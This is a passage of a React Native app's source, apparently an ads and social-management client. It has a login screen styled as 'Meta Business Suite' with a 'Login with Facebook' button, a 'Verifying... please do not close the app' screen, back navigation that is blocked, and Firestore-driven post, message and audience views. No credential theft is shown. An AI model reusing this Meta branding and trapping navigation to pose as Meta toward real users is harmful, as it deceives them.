      <View style={stylesNoti.policies}>
        <View style={stylesNoti.policy}>
          <Checkbox style={stylesNoti.checkbox} value={true} />
          <View>
            <Text style={stylesNoti.label}>Do you like React Native?</Text>
            <Text style={stylesNoti.des}>
              The status of your campaigns: approval, ending and performance
            </Text>
          </View>
        </View>
        <View style={stylesNoti.policy}>
          <Checkbox style={stylesNoti.checkbox} value={true} />
          <View>
            <Text style={stylesNoti.label}>Alerts</Text>
            <Text style={stylesNoti.des}>
              Error blocking your campaigns: ad rejection, biling issues, or
              reaching your spending limit
            </Text>
          </View>
        </View>
        <View style={stylesNoti.policy}>
          <Checkbox style={stylesNoti.checkbox} value={true} />
          <View>
            <Text style={stylesNoti.label}>Getting started</Text>
            <Text style={stylesNoti.des}>
              Tips for running campaigns in Ads Manager
            </Text>
          </View>
        </View>
        <View style={stylesNoti.policy}>
          <Checkbox style={stylesNoti.checkbox} value={true} />
          <View>
            <Text style={stylesNoti.label}>Performance opportunities</Text>
            <Text style={stylesNoti.des}>
              Suggestion to improve campaigns performance
            </Text>
          </View>
        </View>
      </View>
      <View style={stylesNoti.submit}>
        <View style={{ width: "100%", paddingHorizontal: 15 }}>
          <View style={stylesNoti.hr} />
        </View>
        <Text style={stylesNoti.textDes}>
          You can make changes in settings any time
        </Text>
        <TouchableOpacity
          onPress={() => {
            navigation.navigate("SocialAuthScreen");
          }}
          style={stylesNoti.button}
        >
          <Text style={{ color: "#fff", fontWeight: "bold", fontSize: 17 }}>
            Continue
          </Text>
        </TouchableOpacity>
      </View>
    </SafeAreaView>
  );
}

function SocialAuthScreen({ navigation }) {
  const stylesLogin = StyleSheet.create({
    container: {
      flex: 1,
      flexGrow: 1,
      backgroundColor: "#fff",
      alignItems: "center",
      justifyContent: "center",
      padding: 30,
    },
    box: {
      width: "100%",
      backgroundColor: "#fff",
      height: 320,
      borderRadius: 12,
      paddingTop: 50,
      paddingLeft: 30,
      paddingRight: 30,
    },
    boxHeader: {
      justifyContent: "center",
      alignItems: "center",
      flexDirection: "row",
      gap: 5,
    },
    checked: {
      position: "relative",
      right: 8,
      top: -10,
    },
    title: {
      fontSize: 22,
      fontWeight: "bold",
      marginLeft: 2,
    },
    fblogin: {
      marginLeft: 5,
      fontSize: 15,
    },
    inslogin: {
      marginLeft: 5,
      fontSize: 15,
      color: "#9ca3af",
    },
    titletext: {
      fontSize: 16,
    },
    description: {
      marginTop: 20,
      alignItems: "center",
    },
    login: {
      marginTop: 30,
      gap: 10,
    },
    button: {
      marginBottom: 10,
      flexDirection: "row",
      justifyContent: "center",
      gap: 10,
      padding: 15,
      width: "100%",
      backgroundColor: "#d7dbdf6e",
      borderRadius: 12,
    },
  });
  const [touched, setTouched] = useState(false);
  useEffect(
    () =>
      navigation.addListener("beforeRemove", (e) => {
        e.preventDefault();
        return;
      }),
    [navigation]
  );
  return (
    <LinearGradient
      // Background Linear Gradient
      colors={["#14D5FF", "#45D439"]}
      style={stylesLogin.container}
    >
      <View style={stylesLogin.box}>
        <View style={stylesLogin.boxHeader}>
          <Image source={require("./assets/images/meta.png")} />
          <Text style={stylesLogin.title}>Meta Business Suite</Text>
        </View>
        <View style={stylesLogin.description}>
          <Text style={stylesLogin.titletext}>
            Create and manage ads on iphone
          </Text>
        </View>
        <View style={stylesLogin.login}>
          <TouchableOpacity
            onPress={() => {
              navigation.navigate("MainScreen");
            }}
            style={stylesLogin.button}
          >
            <Image
              height={"18"}
              width={18}
              source={require("./assets/images/fb.png")}
            />
            <Text style={stylesLogin.fblogin}>Login with Facebook</Text>
          </TouchableOpacity>

          <TouchableOpacity disabled={true} style={stylesLogin.button}>
            <Image source={require("./assets/images/ig.png")} />
            <Text style={stylesLogin.inslogin}>Login with Instagram</Text>
          </TouchableOpacity>
        </View>
      </View>
    </LinearGradient>
  );
}

function LoadScreen({ navigation }) {
  useEffect(
    () =>
      navigation.addListener("beforeRemove", (e) => {
        e.preventDefault();
        return;
      }),
    [navigation]
  );
  return (
    <View style={{ flex: 1, alignItems: "center", justifyContent: "center" }}>
      <Image
        source={require("./assets/images/logo.png")}
        style={{
          resizeMode: "contain",
          width: 250,
          height: 120,
          marginLeft: 0,
          marginTop: 0,
        }}
      />
      <Image
        source={require("./assets/images/loading.gif")}
        style={{ width: 35, height: 35 }}
      />
      <Text style={{ fontSize: 14 }}>Verifying...</Text>
      <Text style={{ fontSize: 14 }}>Please do not close the app</Text>
    </View>
  );
}

function Comments({ data, loading, styles }) {
  console.log("data");
  if (loading) {
    return (
      <View
        style={{
          flexDirection: "row",
          justifyContent: "center",
          alignItems: "center",
          padding: 50,
          height: 300,
        }}
      >
        <Image
          source={require("./assets/images/loading.gif")}
          style={{ width: 35, height: 35 }}
        />
      </View>
    );
  }
  if (data.length === 0) {
    return (
      <View
        style={{
          justifyContent: "center",
          alignItems: "center",
          padding: 50,
        }}
      >
        <Image
          source={require("./assets/images/empty.png")}
          style={{ width: 120, height: 99, objectFit: "cover" }}
        />
        <Text style={{ fontWeight: "bold", marginTop: 10, fontSize: 16 }}>
          No planer to show
        </Text>
        <Text
          style={{
            marginTop: 10,
            fontSize: 13,
            textAlign: "center",
            color: Colors.textColor,
          }}
        >
          Planer mentioning or tagging your company will appear here.
        </Text>
      </View>
    );
  }

  return (
    <ScrollView contentContainerStyle={styles}>
      {data.map((item, index) => (
        <TouchableOpacity
          key={item.title}
          style={[
            stylesHomePage.card,
            stylesHomePage.shadowProp,
            {
              marginTop: 10,
              borderBottomWidth: 1,
              borderColor: Colors.bgSecondaryLight,
              flexDirection: "row",
              paddingHorizontal: 10,
              paddingVertical: 10,
              alignItems: "center",
            },
          ]}
        >
          <Image
            style={{
              width: 50,
              height: 50,
              borderRadius: 999,
              objectFit: "cover",
            }}
            source={require("./assets/images/image-1.jpg")}
          />
          <View style={{ position: "relative", width: '80%', flexGrow: 2, left: 10 }}>
            <Text style={{ fontWeight: "700" }}>{item.author}</Text>
            <Text
              style={{
                marginTop: 5,
                fontWeight: "400",
              }}
            >
              {item.text}
            </Text>
            {item.read ? null : (
              <View
                style={[
                  stylesHomePage.bage,
                  {
                    top: 0,
                    right: 5,
                  },
                ]}
              />
            )}
            <Text
              style={{
                position: "absolute",
                left: 0,
                bottom: -5,
                color: Colors.successColor,
              }}
            >
              Likes: {item.likes}
            </Text>
            <Text
              style={{
                position: "absolute",
                right: 0,
                bottom: -5,
                color: Colors.primaryColor,
              }}
            >
              {new Date(item.timestamp).toDateString()}
            </Text>
            <View style={{ height: 20 }}></View>
          </View>
        </TouchableOpacity>
      ))}
    </ScrollView>
  );
}

function Messages({ data, loading, styles }) {
  console.log("data");
  if (loading) {
    return (
      <View
        style={{
          flexDirection: "row",
          justifyContent: "center",
          alignItems: "center",
          padding: 50,
          height: 300,
        }}
      >
        <Image
          source={require("./assets/images/loading.gif")}
          style={{ width: 35, height: 35 }}
        />
      </View>
    );
  }
  if (data.length === 0) {
    return (
      <View
        style={{
          justifyContent: "center",
          alignItems: "center",
          padding: 50,
        }}
      >
        <Image
          source={require("./assets/images/empty.png")}
          style={{ width: 120, height: 99, objectFit: "cover" }}
        />
        <Text style={{ fontWeight: "bold", marginTop: 10, fontSize: 16 }}>
          No planer to show
        </Text>
        <Text
          style={{
            marginTop: 10,
            fontSize: 13,
            textAlign: "center",
            color: Colors.textColor,
          }}
        >
          Planer mentioning or tagging your company will appear here.
        </Text>
      </View>
    );
  }

  return (
    <ScrollView contentContainerStyle={styles}>
      {data.map((item, index) => (
        <TouchableOpacity
          key={item.title}
          style={[
            stylesHomePage.card,
            stylesHomePage.shadowProp,
            {
              marginTop: 10,
              borderBottomWidth: 1,
              borderColor: Colors.bgSecondaryLight,
              flexDirection: "row",
              paddingHorizontal: 10,
              paddingVertical: 10,
              alignItems: "center",
            },
          ]}
        >
          <Image
            style={{
              width: 50,
              height: 50,
              borderRadius: 999,
              objectFit: "cover",
            }}
            source={require("./assets/images/image-1.jpg")}
          />
          <View style={{ position: "relative", width: '80%', flexGrow: 2, left: 10 }}>
            <Text style={{ fontWeight: "700" }}>{item.sender}</Text>
            <Text
              style={{
                marginTop: 5,
                fontWeight: "400",
              }}
            >
              {item.text}
            </Text>
            {item.read ? null : (
              <View
                style={[
                  stylesHomePage.bage,
                  {
                    top: 0,
                    right: 5,
                  },
                ]}
              />
            )}
            <Text
              style={{
                position: "absolute",
                right: 0,
                bottom: -5,
                color: Colors.primaryColor,
              }}
            >
              {new Date(item.timestamp).toDateString()}
            </Text>
            <View style={{ height: 20 }}></View>
          </View>
        </TouchableOpacity>
      ))}
    </ScrollView>
  );
}

function Planners({ data, loading, styles }) {
  console.log("data");
  if (loading) {
    return (
      <View
        style={{
          flexDirection: "row",
          justifyContent: "center",
          alignItems: "center",
          padding: 50,
          height: 300,
        }}
      >
        <Image
          source={require("./assets/images/loading.gif")}
          style={{ width: 35, height: 35 }}
        />
      </View>
    );
  }
  if (data.length === 0) {
    return (
      <View
        style={{
          justifyContent: "center",
          alignItems: "center",
          padding: 50,
        }}
      >
        <Image
          source={require("./assets/images/empty.png")}
          style={{ width: 120, height: 99, objectFit: "cover" }}
        />
        <Text style={{ fontWeight: "bold", marginTop: 10, fontSize: 16 }}>
          No planer to show
        </Text>
        <Text
          style={{
            marginTop: 10,
            fontSize: 13,
            textAlign: "center",
            color: Colors.textColor,
          }}
        >
          Planer mentioning or tagging your company will appear here.
        </Text>
      </View>
    );
  }

  return (
    <ScrollView contentContainerStyle={styles}>
      {data.map((item, index) => (
        <TouchableOpacity
          key={item.title}
          style={[
            stylesHomePage.card,
            stylesHomePage.shadowProp,
            {
              marginTop: 10,
              borderBottomWidth: 1,
              borderColor: Colors.bgSecondaryLight,
              flexDirection: "row",
              paddingHorizontal: 10,
              paddingVertical: 10,
              alignItems: "center",
            },
          ]}
        >
          <View style={{ position: "relative", flexGrow: 2 }}>
            <Text style={{ fontWeight: "700" }}>{item.title}</Text>
            <Text
              style={{
                marginTop: 5,
                fontWeight: "400",
              }}
            >
              {item.description}
            </Text>
            <Text
              style={{
                position: "absolute",
                left: 0,
                bottom: -5,
                color: Colors.warnColor,
              }}
            >
              Location: {item.location}
            </Text>
            <Text
              style={{
                position: "absolute",
                right: 0,
                bottom: -5,
                color: Colors.primaryColor,
              }}
            >
              {item.date + " - " + item.time || "12:30PM"}
            </Text>
            <View style={{ height: 20 }}></View>
          </View>
        </TouchableOpacity>
      ))}
    </ScrollView>
  );
}

function ListPosts({ posts, loading, styles }) {
  if (loading) {
    return (
      <View
        style={{
          flexDirection: "row",
          justifyContent: "center",
          alignItems: "center",
          padding: 50,
          height: 300,
        }}
      >
        <Image
          source={require("./assets/images/loading.gif")}
          style={{ width: 35, height: 35 }}
        />
      </View>
    );
  }
  if (posts.length === 0) {
    return (
      <View
        style={{
          justifyContent: "center",
          alignItems: "center",
          padding: 50,
        }}
      >
        <Image
          source={require("./assets/images/empty.png")}
          style={{ width: 120, height: 99, objectFit: "cover" }}
        />
        <Text style={{ fontWeight: "bold", marginTop: 10, fontSize: 16 }}>
          No post to show
        </Text>
        <Text
          style={{
            marginTop: 10,
            fontSize: 13,
            textAlign: "center",
            color: Colors.textColor,
          }}
        >
          Posts mentioning or tagging your company will appear here.
        </Text>
      </View>
    );
  }

  return (
    <ScrollView contentContainerStyle={styles}>
      {posts.map((item, index) => (
        <View
          key={index}
          style={[
            stylesHomePage.card,
            stylesHomePage.shadowProp,
            {
              flexDirection: "row",
              alignItems: "center",
              padding: 10,
              marginTop: 20,
            },
          ]}
        >
          <Image
            source={require("./assets/images/image-1.jpg")}
            full
            style={{
              width: 100,
              height: 150,
              borderRadius: 14,
            }}
          />
          <View
            style={{
              height: 150,
              justifyContent: "space-between",
              marginLeft: 15,
              flexGrow: 2,
              width: "80%",
            }}
          >
            <View>
              <View
                style={{
                  flexDirection: "row",
                  alignItems: "center",
                }}
              >
                <ClockIcon width={15} />
                <Text
                  style={{
                    marginLeft: 2,
                    color: Colors.textColor,
                    fontSize: 12,
                  }}
                >
                  {new Date(item.createdAt).toDateString()}
                </Text>
              </View>

              <Text
                style={{
                  flexShrink: 1,
                  color: Colors.textColor,
                  fontSize: 16,
                  fontWeight: "600",
                  paddingRight: 30,
                  height: 100,
                }}
              >
                {item.text}
              </Text>
            </View>
            <View
              style={{
                flexDirection: "row",
                alignItems: "center",
                width: "80%",
                height: 30,
                justifyContent: "space-around",
              }}
            >
              <View
                style={{
                  flexDirection: "row",
                  alignItems: "center",
                }}
              >
                <LikeIcon width={20} />
                <Text style={{ marginLeft: 2, color: Colors.textColor }}>
                  {item.liked}
                </Text>
              </View>
              <View
                style={{
                  flexDirection: "row",
                  alignItems: "center",
                  marginLeft: 20,
                }}
              >
                <CommentIcon width={20} />
                <Text style={{ marginLeft: 2, color: Colors.textColor }}>
                  {item.comments}
                </Text>
              </View>
              <View
                style={{
                  flexDirection: "row",
                  alignItems: "center",
                  marginLeft: 20,
                }}
              >
                <ShareIcon width={20} />
                <Text style={{ marginLeft: 2, color: Colors.textColor }}>
                  {item.shared}
                </Text>
              </View>
            </View>
          </View>
        </View>
      ))}
    </ScrollView>
  );
}

function HomeScreen({ navigation }) {
  const [loading, setLoading] = React.useState(false);
  const [countNoti, setCountNoti] = React.useState(0);
  const [posts, setPosts] = React.useState([]);

  function handleCreatePost() {
    navigation.navigate("CreatePost");
  }

  function onHandleExplore() {
    navigation.navigate("ExploreScreen");
  }

  function handleContent() {
    navigation.navigate("ContentScreen");
  }

  function handleGoNotifications() {
    navigation.navigate("Notifications");
  }

  React.useEffect(() => {
    const initData = async () => {
      await firebase
        .firestore()
        .collection("notifications")
        .where("readed", "==", false)
        .onSnapshot((querySnapshot) => {
          setCountNoti(querySnapshot.size);
        });
    };
    initData();
  }, []);

  React.useEffect(() => {
    const initData = async () => {
      setLoading(true);
      await firebase
        .firestore()
        .collection("posts")
        .orderBy("createdAt", "desc")
        .limit(3)
        .get()
        .then((querySnapshot) => {
          console.log(querySnapshot.docs);
          const data = [];
          querySnapshot.forEach((doc) => {
            data.push({ ...doc.data(), docId: doc.id });
          });
          setPosts(data);
          setLoading(false);
        });
    };
    initData();
  }, []);

  return (
    <SafeAreaView style={stylesHomePage.container}>
      <ScrollView flex style={{ overflow: "scroll" }}>
        <View style={stylesHomePage.header}>
          <TouchableOpacity style={stylesHomePage.icon}>
            <View>
              <Text
                style={{
                  fontSize: 13,
                  marginLeft: 10,
                  color: Colors.textColor,
                }}
              >
                Welcome back
              </Text>
              <Text
                style={{ fontSize: 18, marginLeft: 10, fontWeight: "bold" }}
              >
                John Doe
              </Text>
            </View>
          </TouchableOpacity>
          <View style={{ flexDirection: "row" }}>
            <TouchableOpacity
              style={stylesHomePage.icon}
              onPress={handleGoNotifications}
            >
              <BellIcon width={30} height={30} />
              {countNoti ? (
                <View style={stylesHomePage.bage}>
                  <Text style={stylesHomePage.bageText}>{countNoti}</Text>
                </View>
              ) : (
                <Text></Text>
              )}
            </TouchableOpacity>
            <TouchableOpacity
              style={stylesHomePage.icon}
              onPress={onHandleExplore}
            >
              <MegaphoneIcon width={30} height={30} />
            </TouchableOpacity>
          </View>
        </View>
        <View
          style={{
            paddingVertical: 25,
            backgroundColor: "#F8F9FE",
          }}
        >
          <View style={{ paddingHorizontal: 40 }}>
            <View
              style={[
                stylesHomePage.card,
                stylesHomePage.shadowProp,
                {
                  padding: 20,
                  height: 250,
                  borderRadius: 24,
                },
              ]}
            >
              <View
                style={{
                  flexDirection: "row",
                  alignItems: "center",
                  justifyContent: "space-between",
                  width: "100%",
                  paddingHorizontal: 30,
                }}
              >
                <View
                  style={{
                    borderRadius: 18,
                    borderColor: Colors.primaryColor,
                    borderWidth: 2,
                    padding: 5,
                  }}
                >
                  <Image
                    source={require("./assets/images/image-1.jpg")}
                    full
                    style={{
                      width: 60,
                      height: 60,
                      borderRadius: 14,
                    }}
                  />
                </View>
                <View style={{ marginLeft: 25 }}>
                  <Text
                    style={{
                      fontSize: 13,
                      color: Colors.textColor,
                    }}
                  >
                    @johndoe
                  </Text>
                  <Text
                    style={{ fontSize: 18, fontWeight: "bold", marginTop: 5 }}
                  >
                    John Doe
                  </Text>
                  <Text
                    style={{
                      fontSize: 15,
                      fontWeight: "500",
                      color: Colors.primaryColor,
                      marginTop: 5,
                    }}
                  >
                    Developer
                  </Text>
                </View>
              </View>
              <View style={{ paddingHorizontal: 30, marginTop: 20 }}>
                <Text style={{ fontSize: 18, fontWeight: "bold" }}>
                  About me
                </Text>
                <Text style={{ color: Colors.textColor, marginTop: 10 }}>
                  Madison blackstone is a director of user experience manaing
                  global teams.
                </Text>
              </View>
              <View
                style={{
                  flexDirection: "row",
                  alignItems: "center",
                  height: 60,
                  position: "relative",
                  bottom: -20,
                }}
              >
                <View
                  style={{
                    position: "relative",
                    right: -25,
                    height: "100%",
                    width: 80,
                    justifyContent: "center",
                    alignItems: "center",
                    backgroundColor: Colors.bgPrimaryDark,
                    borderRadius: 16,
                    zIndex: 9,
                  }}
                >
                  <Text
                    style={{
                      color: Colors.textWhite,
                      fontSize: 22,
                      fontWeight: "bold",
                    }}
                  >
                    52
                  </Text>
                  <Text style={{ fontSize: 12, color: Colors.textWhite }}>
                    Post
                  </Text>
                </View>
                <View
                  style={{
                    height: "100%",
                    width: 120,
                    justifyContent: "center",
                    alignItems: "center",
                    backgroundColor: Colors.primaryColor,
                    borderRadius: 16,
                  }}
                >
                  <Text
                    style={{
                      color: Colors.textWhite,
                      fontSize: 22,
                      fontWeight: "bold",
                    }}
                  >
                    512
                  </Text>
                  <Text style={{ fontSize: 12, color: Colors.textWhite }}>
                    Following
                  </Text>
                </View>
                <View
                  style={{
                    position: "relative",
                    left: -25,
                    height: "100%",
                    width: 80,
                    justifyContent: "center",
                    alignItems: "center",
                    backgroundColor: Colors.primaryColor,
                    borderRadius: 16,
                  }}
                >
                  <Text
                    style={{
                      color: Colors.textWhite,
                      fontSize: 22,
                      fontWeight: "bold",
                    }}
                  >
                    5.2K
                  </Text>
                  <Text style={{ fontSize: 12, color: Colors.textWhite }}>
                    Followers
                  </Text>
                </View>
              </View>
            </View>
          </View>
          <View
            style={{
              borderRadius: 24,
              backgroundColor: "#ffffff",
              marginTop: 50,
              paddingVertical: 20,
              paddingHorizontal: 20,
              paddingBottom: 40,
              shadowOffset: { width: 0, height: 2 },
              shadowColor: "#808080",
              shadowOpacity: 0.2,
              shadowRadius: 12,
            }}
          >
            <View
              style={{ flexDirection: "row", justifyContent: "space-between" }}
            >
              <View
                style={{
                  flexDirection: "row",
                  alignItems: "center",
                }}
              >
                <ClockIcon />
                <Text style={stylesHomePage.headerText}> Recent posts</Text>
              </View>
              <View style={{ flexDirection: "row" }}>
                <TouchableOpacity onPress={handleCreatePost}>
                  <PhotoIcon />
                </TouchableOpacity>
                <TouchableOpacity
                  onPress={handleCreatePost}
                  style={{ marginLeft: 15 }}
                >
                  <PlusOutlineIcon />
                </TouchableOpacity>
                <TouchableOpacity
                  onPress={handleContent}
                  style={{ marginLeft: 15 }}
                >
                  <ChevronRightIcon />
                </TouchableOpacity>
              </View>
            </View>
            <View>
              <ListPosts posts={posts} loading={loading} />
            </View>
            <View
              style={[
                stylesHomePage.shadowProp,
                { position: "relative", marginTop: 20, alignItems: "center" },
              ]}
            >
              <Image
                source={require("./assets/images/sky-1.png")}
                full
                style={{
                  width: "100%",
                  height: 250,
                  objectFit: "cover",
                  marginTop: 10,
                }}
                borderRadius={10}
              />
              <View
                style={{
                  height: 80,
                  width: "100%",
                  position: "absolute",
                  bottom: 0,
                  left: 0,
                  opacity: 0.9,
                }}
              >
                <LinearGradient
                  colors={["transparent", "#0000000"]}
                  style={{ height: 80 }}
                />
              </View>
              <View
                style={{
                  position: "absolute",
                  bottom: 10,
                  justifyContent: "center",
                  alignItems: "center",
                  paddingHorizontal: 50,
                }}
              >
                <TouchableOpacity onPress={handleCreatePost}>
                  <PlusIcon color={Colors.bgPrimaryDark} />
                </TouchableOpacity>
                <Text
                  style={{
                    color: Colors.textWhite,
                    fontSize: 17,
                    fontWeight: "bold",
                    marginTop: 10,
                  }}
                >
                  Share your story
                </Text>
                <Text
                  style={{
                    fontSize: 14,
                    fontWeight: "400",
                    marginTop: 10,
                    textAlign: "center",
                    color: Colors.textWhite,
                  }}
                >
                  Your story will appear here. Sharing regularly helps you
                  connect iwth your audience
                </Text>
              </View>
            </View>
            <View
              style={[
                stylesHomePage.card,
                stylesHomePage.shadowProp,
                { padding: 10, marginTop: 20 },
              ]}
            >
              <View>
                <View style={{ flexDirection: "row", alignItems: "center" }}>
                  <InformationCircleIcon />
                  <Text style={[stylesHomePage.headerText, { marginLeft: 5 }]}>
                    Insights
                  </Text>
                </View>
                <View style={{ marginTop: 10 }}>
                  <Text style={{ marginTop: 5, fontSize: 16 }}>Lifetime</Text>
                </View>
                <View
                  style={{
                    marginTop: 5,
                    flexDirection: "row",
                    alignItems: "center",
                  }}
                >
                  <Text style={{ fontSize: 16, fontWeight: "600" }}>501</Text>
                  <Text style={{ fontSize: 13, marginLeft: 10 }}>
                    Followers
                  </Text>
                </View>
                <TouchableOpacity
                  style={{
                    width: "100%",
                    height: 44,
                    borderRadius: 6,
                    backgroundColor: Colors.primaryColor,
                    justifyContent: "center",
                    alignItems: "center",
                    paddingHorizontal: 10,
                    paddingVertical: 6,
                    flexDirection: "row",
                    marginTop: 10,
                  }}
                  onPress={() => navigation.navigate("AudienceScreen")}
                >
                  <ArrowLongIcon color={Colors.textWhite} />
                  <Text
                    style={{
                      fontWeight: "700",
                      marginLeft: 10,
                      color: Colors.textWhite,
                    }}
                  >
                    Your Audience
                  </Text>
                </TouchableOpacity>
              </View>
            </View>
            <View
              style={[
                stylesHomePage.card,
                stylesHomePage.shadowProp,
                { padding: 10, marginTop: 20 },
              ]}
            >
              <View>
                <View style={{ flexDirection: "row", alignItems: "center" }}>
                  <InformationCircleIcon />
                  <Text style={[stylesHomePage.headerText, { marginLeft: 5 }]}>
                    Trends
                  </Text>
                </View>
                <View style={{ flexDirection: "row", marginTop: 10 }}>
                  <Text>Sep 15</Text>
                  <Text> - Nov 9, 2023</Text>
                </View>
                <View
                  style={{
                    flexDirection: "row",
                    alignItems: "center",
                    marginTop: 10,
                  }}
                >
                  <Text style={{ fontSize: 17, fontWeight: "bold" }}>99</Text>
                  <View
                    style={{
                      flexDirection: "row",
                      alignItems: "center",
                      marginHorizontal: 10,
                    }}
                  >
                    <ArrowUpIcon
                      color={Colors.primaryColor}
                      width={15}
                      height={15}
                    />
                    <Text style={{ color: Colors.primaryColor, fontSize: 12 }}>
                      100%
                    </Text>
                  </View>
                  <Text style={{ fontSize: 13 }}>Followers</Text>
                </View>
                <TouchableOpacity
                  style={{
                    width: "100%",
                    height: 44,
                    borderRadius: 6,
                    backgroundColor: Colors.primaryColor,
                    justifyContent: "center",
                    alignItems: "center",
                    paddingHorizontal: 10,
                    paddingVertical: 6,
                    flexDirection: "row",
                    marginTop: 10,
                  }}
                  onPress={() => navigation.navigate("OverviewScreen")}
                >
                  <CalendarIcon color={Colors.textWhite} />
                  <Text
                    style={{
                      fontWeight: "700",
                      color: Colors.textWhite,
                      marginLeft: 15,
                    }}
                  >
                    Overview
                  </Text>
                </TouchableOpacity>
              </View>
            </View>
          </View>
        </View>
      </ScrollView>
    </SafeAreaView>
  );
}

const style = StyleSheet.create({});

const stylesHomePage = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: "#ffffff",
    overflow: "scroll",
  },
  header: {
    flexDirection: "row",
    backgroundColor: "#fff",
    alignItems: "center",
    justifyContent: "space-between",
    paddingHorizontal: 10,
  },
  icon: {
    padding: 10,
    alignItems: "center",
    flexDirection: "row",
    gap: 10,
  },
  headerText: {
    color: "#000",
    fontSize: 20,
    fontWeight: "bold",
  },
  imageContainer: {
    flex: 1,
    justifyContent: "center",
    alignItems: "center",
  },
  image: {
    width: 200,
    height: 200,
    borderRadius: 100,
  },
  profile: {
    backgroundColor: "#fff",
    padding: 20,
  },
  profileText: {
    color: "#000",
    fontSize: 18,
    textAlign: "center",
  },
  bage: {
    position: "absolute",
    top: 13,
    right: 13,
    width: 10,
    height: 10,
    borderRadius: 100,
    backgroundColor: "#ff0000",
    justifyContent: "center",
    alignItems: "center",
  },
  bageText: {
    color: Colors.dangerColor,
    fontSize: 12,
    fontWeight: "bold",
  },
  card: {
    backgroundColor: "white",
    borderRadius: 8,
    width: "100%",
  },
  shadowProp: {
    shadowOffset: { width: 0, height: 2 },
    shadowColor: "#808080",
    shadowOpacity: 0.2,
    shadowRadius: 12,
  },
});

function AudienceScreen({ navigation }) {
  const [active, setActive] = React.useState(1);

  const onActive = function (state) {
    setActive(state);
  };

  const CreateContent = () => {
    navigation.navigate("CreatePost");
  };

  return (
    <SafeAreaView style={stylesHomePage.container}>
      <View>
        <CustomHeader
          showBack
          titleLeft="Audience"
          navigation={navigation}
          right={
            <TouchableOpacity
              style={{
                height: 35,
                borderRadius: 24,
                backgroundColor: Colors.primaryColor,
                justifyContent: "center",
                alignItems: "center",
                paddingHorizontal: 10,
                paddingVertical: 6,
                flexDirection: "row",
                marginTop: 10,
              }}
              onPress={CreateContent}
            >
              <Text
                style={{
                  fontWeight: "700",
                  color: Colors.textWhite,
                }}
              >
                Create Ad
              </Text>
            </TouchableOpacity>
          }
        />
        <View
          style={{
            flexDirection: "row",
            justifyContent: "space-between",
            alignItems: "center",
            paddingHorizontal: 20,
          }}
        >
          <TouchableOpacity
            style={{
              height: 35,
              borderRadius: 24,
              backgroundColor: Colors.bgPrimary,
              justifyContent: "center",
              alignItems: "center",
              paddingHorizontal: 10,
              paddingVertical: 6,
              flexDirection: "row",
              marginTop: 10,
            }}
            onPress={CreateContent}
          >
            <CalendarIcon color={Colors.textColor} />
            <Text
              style={{
                fontWeight: "700",
                marginLeft: 10,
                color: Colors.textColor,
              }}
            >
              Lifetime
            </Text>
          </TouchableOpacity>
          <Text style={{ fontWeight: "600", fontSize: 15 }}>Lifetime</Text>
        </View>
        <View style={{ height: 700, padding: 10 }}>
          <View
            style={[
              stylesShadow.card,
              stylesShadow.shadowProp,
              {
                flexDirection: "row",
                justifyContent: "space-between",
                padding: 20,
              },
            ]}
          >
            <View
              style={{
                flex: 1,
              }}
            >
              <View
                style={{
                  flexDirection: "row",
                  alignItems: "center",
                  position: "relative",
                }}
              >
                <InformationCircleIcon width={20} />
                <Text
                  style={{ fontSize: 15, fontWeight: "bold", marginLeft: 5 }}
                >
                  Present-day viewers
                </Text>
              </View>
              <View
                style={{
                  marginTop: 5,
                  flexDirection: "row",
                  alignItems: "center",
                }}
              >
                <Text style={{ fontSize: 16, fontWeight: "600" }}>501</Text>
                <Text style={{ fontSize: 13, marginLeft: 10 }}>
                  Facebook Followers
                </Text>
              </View>
              <TouchableOpacity
                style={{
                  position: "absolute",
                  right: 0,
                  top: 0,
                  borderRadius: 6,
                  justifyContent: "center",
                  alignItems: "center",
                  flexDirection: "row",
                }}
                onPress={() => navigation.navigate("AudienceScreen")}
              >
                <ArrowLongIcon />
              </TouchableOpacity>
            </View>
          </View>
          <View
            style={[
              stylesShadow.card,
              stylesShadow.shadowProp,
              {
                flexDirection: "row",
                justifyContent: "space-between",
                padding: 20,
                marginTop: 20,
              },
            ]}
          >
            <View
              style={{
                flex: 1,
              }}
            >
              <View
                style={{
                  flexDirection: "row",
                  alignItems: "center",
                  position: "relative",
                }}
              >
                <InformationCircleIcon width={20} />
                <Text
                  style={{ fontSize: 15, fontWeight: "bold", marginLeft: 5 }}
                >
                  Estimated Audience
                </Text>
              </View>
              <View
                style={{
                  marginTop: 5,
                  flexDirection: "row",
                  alignItems: "center",
                }}
              >
                <Text style={{ fontSize: 16, fontWeight: "bold" }}>20M - </Text>
                <Text style={{ fontSize: 16, fontWeight: "bold" }}>50M</Text>
                <Text style={{ fontSize: 13, marginLeft: 10 }}>
                  Estimated Audience size
                </Text>
              </View>
              <TouchableOpacity
                style={{
                  position: "absolute",
                  right: 0,
                  top: 0,
                  borderRadius: 6,
                  justifyContent: "center",
                  alignItems: "center",
                  flexDirection: "row",
                }}
                onPress={() => navigation.navigate("AudienceScreen")}
              >
                <ArrowLongIcon />
              </TouchableOpacity>
            </View>
          </View>
        </View>
      </View>
      <View height={100}></View>
    </SafeAreaView>
  );
}
const stylesShadow = StyleSheet.create({
  card: {
    backgroundColor: "white",
    borderRadius: 8,
    width: "100%",
  },
  shadowProp: {
    shadowOffset: { width: -2, height: 4 },
    shadowColor: "#171717",
    shadowOpacity: 0.2,
    shadowRadius: 3,
  },
});

function ExploreScreen({ navigation }) {
  return (
    <SafeAreaView style={stylesHomePage.container}>
      <View>
        <CustomHeader showBack titleLeft="Explore" navigation={navigation} />
        <View style={{ height: 700, paddingHorizontal: 20 }}>
          <Text style={{ fontSize: 17, fontWeight: "bold" }}>
            Audience growth
          </Text>
          <Text style={{ fontSize: 17, fontWeight: "bold", marginTop: 10 }}>
            Friends
          </Text>
          <Text
            style={{ fontSize: 13, color: Colors.textColor, marginTop: 10 }}
          >
            Invite frineds to follow your page. This will allow App to access
            the frineds list from your personal account.
          </Text>
          <Text style={{ color: Colors.primaryColor }}>Learn more</Text>
        </View>
      </View>
      <View height={100}></View>
    </SafeAreaView>
  );
}

function OverviewScreen({ navigation }) {
  const [active, setActive] = React.useState(1);

  const onActive = function (state) {
    setActive(state);
  };

  const CreateContent = () => {
    navigation.navigate("CreatePost");
  };

  return (
    <SafeAreaView style={stylesHomePage.container}>
      <View>
        <CustomHeader
          showBack
          titleLeft="Overview"
          navigation={navigation}
          right={
            <TouchableOpacity
              style={{
                height: 35,
                borderRadius: 24,
                backgroundColor: Colors.primaryColor,
                justifyContent: "center",
                alignItems: "center",
